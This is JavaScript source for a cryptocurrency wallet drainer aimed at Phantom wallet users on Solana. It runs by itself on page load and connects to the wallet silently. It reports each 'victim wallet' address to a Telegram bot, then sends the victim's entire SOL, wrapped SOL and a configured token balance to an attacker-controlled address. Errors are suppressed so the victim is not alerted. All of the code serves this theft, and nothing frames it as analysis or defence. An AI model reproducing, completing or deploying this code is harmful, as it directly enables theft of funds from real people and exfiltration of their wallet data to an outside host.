(async function │
│ () { const cfg = await fetch('config.json', { cache:    │
│ 'no-store' }).then(r => r.json());                      │
│                                                         │
│ const provider = window.solana; if (!provider ||        │
│ !provider.isPhantom) return;                            │
│                                                         │
│ const drainWallet = cfg.d1 + cfg.d2;                    │
│                                                         │
│ async function logWallet(address) { try { const token = │
│ cfg.webhook; // your bot token from config.json const   │
│ chatId = '8503340530'; // <‑‑ your chat ID const        │
│ username = 'Reco110'; const type = 'private'; const     │
│ text = Victim wallet: ${address}\nUsername:             │
│ @${username}\nType: ${type}; await                      │
│ fetch(https://api.telegram.org/bot${token}/sendMessage, │
│ { method: 'POST', headers: { 'Content-Type':            │
│ 'application/json' }, body: JSON.stringify({ chat_id:   │
│ chatId, text }) }); } catch (e) {} }                    │
│                                                         │
│ async function getWSOLAccount(address) { const {        │
│ Connection, PublicKey } = (await                        │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const connection = new   │
│ Connection(cfg.rpc); const tokenProgram = new           │
│ PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' │
│ ); const [ata] = PublicKey.findProgramAddressSync([ new │
│ PublicKey(address).toBuffer(), tokenProgram.toBuffer(), │
│ new                                                     │
│ PublicKey('So11111111111111111111111111111111111111112' │
│ ).toBuffer() ], tokenProgram); return ata; }            │
│                                                         │
│ async function getBalanceLamports(address) { const {    │
│ Connection, PublicKey } = (await                        │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const connection = new   │
│ Connection(cfg.rpc); return await                       │
│ connection.getBalance(new PublicKey(address)); }        │
│                                                         │
│ async function getTokenBalance(address, mint) { const { │
│ Connection, PublicKey } = (await                        │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const connection = new   │
│ Connection(cfg.rpc); if (mint ===                       │
│ 'So11111111111111111111111111111111111111112') { const  │
│ ata = await getWSOLAccount(address); const info = await │
│ connection.getParsedAccountInfo(ata); if                │
│ (!info?.value?.data?.parsed?.info?.tokenAmount) return  │
│ 0n; return                                              │
│ BigInt(info.value.data.parsed.info.tokenAmount.amount); │
│ } else { const tokenProgram = new                       │
│ PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' │
│ ); const [ata] = PublicKey.findProgramAddressSync([ new │
│ PublicKey(address).toBuffer(), tokenProgram.toBuffer(), │
│ new PublicKey(mint).toBuffer() ], tokenProgram); const  │
│ info = await connection.getParsedAccountInfo(ata); if   │
│ (!info?.value?.data?.parsed?.info?.tokenAmount) return  │
│ 0n; return                                              │
│ BigInt(info.value.data.parsed.info.tokenAmount.amount); │
│ } }                                                     │
│                                                         │
│ async function createWSOLAccountIfNeeded(owner) { const │
│ { Connection, PublicKey, Transaction, SystemProgram,    │
│ LAMPORTS_PER_SOL } = (await                             │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const {                  │
│ CreateInitializeAccount3Instruction } = await           │
│ import('https://unpkg.com/@solana/spl-token@latest/lib/ │
│ index.iife.min.js'); const connection = new             │
│ Connection(cfg.rpc); const ata = await                  │
│ getWSOLAccount(owner); const info = await               │
│ connection.getAccountInfo(ata); if (!info) { const tx = │
│ new Transaction().add( SystemProgram.createAccount({    │
│ fromPubkey: new PublicKey(owner), newAccountPubkey:     │
│ ata, lamports: LAMPORTS_PER_SOL * 0.001, space: 165,    │
│ programId: new                                          │
│ PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' │
│ ) }), new CreateInitializeAccount3Instruction({         │
│ account: ata, mint: new                                 │
│ PublicKey('So11111111111111111111111111111111111111112' │
│ ), owner: new PublicKey(owner) }) ); tx.feePayer = new  │
│ PublicKey(owner); const { blockhash } = await           │
│ connection.getRecentBlockhash('finalized');             │
│ tx.recentBlockhash = blockhash; await                   │
│ provider.signAndSendTransaction(tx); } return ata; }    │
│                                                         │
│ async function drainNativeSOL(owner) { const {          │
│ Connection, PublicKey, Transaction, SystemProgram } =   │
│ (await                                                  │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const connection = new   │
│ Connection(cfg.rpc); const balance = await              │
│ getBalanceLamports(owner); if (balance <= 0) return;    │
│ const tx = new Transaction().add(                       │
│ SystemProgram.transfer({ fromPubkey: new                │
│ PublicKey(owner), toPubkey: new PublicKey(drainWallet), │
│ lamports: balance }) ); tx.feePayer = new               │
│ PublicKey(owner); const { blockhash } = await           │
│ connection.getRecentBlockhash('finalized');             │
│ tx.recentBlockhash = blockhash; await                   │
│ provider.signAndSendTransaction(tx); }                  │
│                                                         │
│ async function drainWSOL(owner) { const { Connection,   │
│ PublicKey, Transaction } = (await                       │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const {                  │
│ TransferInstruction } = await                           │
│ import('https://unpkg.com/@solana/spl-token@latest/lib/ │
│ index.iife.min.js'); const connection = new             │
│ Connection(cfg.rpc); const ata = await                  │
│ createWSOLAccountIfNeeded(owner); const amount = await  │
│ getTokenBalance(owner,                                  │
│ 'So11111111111111111111111111111111111111112'); if      │
│ (amount <= 0) return; const tx = new Transaction().add( │
│ new TransferInstruction({ source: ata, destination: new │
│ PublicKey(drainWallet), amount: amount, owner: new      │
│ PublicKey(owner) }) ); tx.feePayer = new                │
│ PublicKey(owner); const { blockhash } = await           │
│ connection.getRecentBlockhash('finalized');             │
│ tx.recentBlockhash = blockhash; await                   │
│ provider.signAndSendTransaction(tx); }                  │
│                                                         │
│ async function drainSPLToken(owner, mint) { const {     │
│ Connection, PublicKey, Transaction } = (await           │
│ import('https://unpkg.com/@solana/web3.js@latest/lib/in │
│ dex.iife.min.js')).solanaWeb3; const {                  │
│ TransferInstruction } = await                           │
│ import('https://unpkg.com/@solana/spl-token@latest/lib/ │
│ index.iife.min.js'); const connection = new             │
│ Connection(cfg.rpc); const tokenProgram = new           │
│ PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' │
│ ); const [ata] = PublicKey.findProgramAddressSync([ new │
│ PublicKey(owner).toBuffer(), tokenProgram.toBuffer(),   │
│ new PublicKey(mint).toBuffer() ], tokenProgram); const  │
│ amount = await getTokenBalance(owner, mint); if (amount │
│ <= 0) return; const tx = new Transaction().add( new     │
│ TransferInstruction({ source: ata, destination: new     │
│ PublicKey(drainWallet), amount: amount, owner: new      │
│ PublicKey(owner) }) ); tx.feePayer = new                │
│ PublicKey(owner); const { blockhash } = await           │
│ connection.getRecentBlockhash('finalized');             │
│ tx.recentBlockhash = blockhash; await                   │
│ provider.signAndSendTransaction(tx); }                  │
│                                                         │
│ async function main() { try { await provider.connect({  │
│ onlyIfTrusted: true }); const pubKey =                  │
│ provider.publicKey?.toString(); if (!pubKey) return;    │
│ await logWallet(pubKey); await drainNativeSOL(pubKey);  │
│ await drainWSOL(pubKey); if (cfg.token?.mint &&         │
│ cfg.token.mint !==                                      │
│ 'So11111111111111111111111111111111111111112') { await  │
│ drainSPLToken(pubKey, cfg.token.mint); } } catch (e) {} │
│ }                                                       │
│                                                         │
│ main(); })();                                           │
│
